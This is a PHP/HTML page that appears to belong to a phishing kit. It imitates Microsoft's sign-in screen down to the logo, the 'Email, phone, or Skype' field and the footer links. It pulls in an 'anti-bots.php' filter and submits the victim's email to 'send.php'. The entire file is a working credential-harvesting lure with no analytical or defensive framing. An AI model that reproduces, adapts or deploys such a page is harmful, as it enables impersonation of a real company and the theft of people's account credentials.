
<?php
require 'anti-bots.php';
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="app.css">
</head>
<body class="cb" style="
    background-position: right;
">
    <div class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup" style="
    margin: 20px auto;
">
<form action="send.php"  method="post" >
    <img src="microsoft_logo.svg" alt="" class="logo"><div class="title"><div role="heading" aria-level="1" data-bind="text: title">Sign in</div></div>
    
    
    
    <input class="form-control ltr_override input ext-input text-box ext-text-box form-group" 
    name="email" required type="text" placeholder="Email, phone, or Skype">

<div class="col-md-24">
<div class="text-13 form-group"> No account? <a href="#">Create one!</a></div>
<div class="text-13 form-group"> <a href="#">Can’t access your account?</a></div><div class="col-xs-24 no-padding-left-right button-container" style="
    position: relative;
"><input type="submit" value="Next" class="button ext-button primary ext-primary" style="display: inline-block;width: auto;"></div>

</form>
</div>


    </div>
    <div class="promoted-fed-cred-content ext-sign-in-box  fade-in-lightbox" style="
    background: white;
    min-width: 320px;
    max-width: 440px;
    margin: 0 auto;
    padding: 0;
">
    <div class="row tile">
                        <div class="table" role="button" tabindex="0">

                            <div class="table-row">
                                <div class="table-cell tile-img medium">
                                    

<img class="tile-img medium" src="key.svg">

                                </div>
                                <div class="table-cell text-left content">
                                    <div>Sign-in options</div>
                                </div>
                            </div>
                        </div>
                    </div>
    </div>
    <div class="footer ext-footer" style="
    text-align: end;
">
    <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item">
Terms of use</a> <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item"> Privacy &amp; cookies</a>
     <a href="#" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...
</a>
</div>

</body></html>